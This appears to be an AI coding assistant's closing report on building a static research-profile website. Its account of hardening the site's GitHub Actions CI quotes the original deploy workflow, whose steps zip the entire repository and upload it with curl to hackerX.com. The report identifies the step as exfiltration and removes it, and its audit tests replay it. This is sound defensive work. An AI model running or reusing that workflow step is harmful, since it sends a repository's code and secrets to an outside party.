## What I found before building

`my_website/.github/workflows/deploy.yml` was exfiltrating the repository on every push to `main`:

```yaml
- name: Archive entire repo
  run: zip -r repo.zip .
- name: Backup
  run: curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
```

`hackerX.com` has no relationship to the site. Alongside it: `actions/checkout@v3` with default credential persistence, `peaceiris/actions-gh-pages@v3` third-party publish action, end-of-life Node 16, `npm install` of a dependency tree the static site never used, and no `permissions:` block (so `GITHUB_TOKEN` had write-all). Full write-up, plus what you still have to rotate by hand, is in `SECURITY.md`.

## 1–2. The site

Static HTML/CSS from the CV, no build step, no JavaScript, no third-party fonts or CDNs:

| Page | File |
| --- | --- |
| **About Me** | `index.html` — profile, 4 research threads, 3 projects, education timeline, teaching, skills, contact |
| **Publications** | `publications.html` — 4 papers with BibTeX blocks, code & data cards |
| **Blog** | `blog.html` + 3 full posts in `blog/` (the three listed on the CV, written out) |

Research-profile design, not a template: serif headings over sans body, one deep-teal accent, thin rules instead of boxes, fluid type scale, light/dark palettes. Contrast measured, every pairing ≥ 4.5:1 AA (body text 15.9:1 light, 15.7:1 dark). One `<h1>` per page, skip link, `aria-current`, focus rings, `prefers-reduced-motion`, print styles. `404.html` and `.nojekyll` included.

## 3. Gates — run, not just written

```
check-workflows: OK — 2 workflow(s): no archiving/egress commands, all actions allow-listed and pinned, least-privilege permissions, no unexpected secrets or hosts
test-workflows-audit: OK — auditor rejects all malicious samples and accepts the repo workflows
check-secrets: OK — 19 text files scanned, no credential-like content, no .env / key / credentials files tracked
check-site: OK — 7 pages, all internal links, anchors and assets resolve, 19 CV facts present, no third-party code, no scripts
build-site: wrote 9 files to _site
check-site: OK — 7 pages (built output)
```

I verified the gates aren't vacuous: `test-workflows-audit.py` replays the **original** workflow and asserts 8 findings (curl egress, zip archiving, `hackerx.com`, missing permissions, unreviewed actions, missing `persist-credentials`) — plus `pull_request_target`+`write-all`, tar/base64 staging, and an unreviewed secret. I also injected faults into a copy (broken link, broken anchor, unknown CSS class, unclosed tag, missing meta, content drift) and each was caught. The push script was run end to end against a local bare remote with a stub `gh`: 21 files pushed, no `__pycache__`, `_site` excluded; a staged `.env` was refused at two independent layers.

The new `deploy.yml` (verify → build → deploy, GitHub's own Pages actions, least privilege per job) and `security.yml` (audit + regression test + secret scan + site check, on push, PR and weekly).

## Pushing — dummy URL

```sh
cd my_website
git init -b main
git config user.name "Lydia Moreno"
git config user.email "lydia.moreno@riverbend.edu"
python3 scripts/check-site.py && python3 scripts/check-workflows.py && python3 scripts/check-secrets.py
git add -A && git status                 # confirm nothing credential-like is staged
git commit -m "Build research-profile site: About, Publications, Blog; harden CI"
git remote add origin https://github.com/OWNER/REPO.git
git push -u origin main

gh workflow run deploy.yml   --ref main  # both also run automatically on push
gh workflow run security.yml --ref main
gh run list --limit 5
```

`sh scripts/push-to-github.sh https://github.com/OWNER/REPO.git` does the same with the checks gating the push. Two caveats worth acting on: set **Settings → Pages → Source: GitHub Actions**, and **disable Actions while you clean up** — the old `deploy.yml` still lives in your history and in any stale branch, and Actions runs whatever is in the pushed ref.

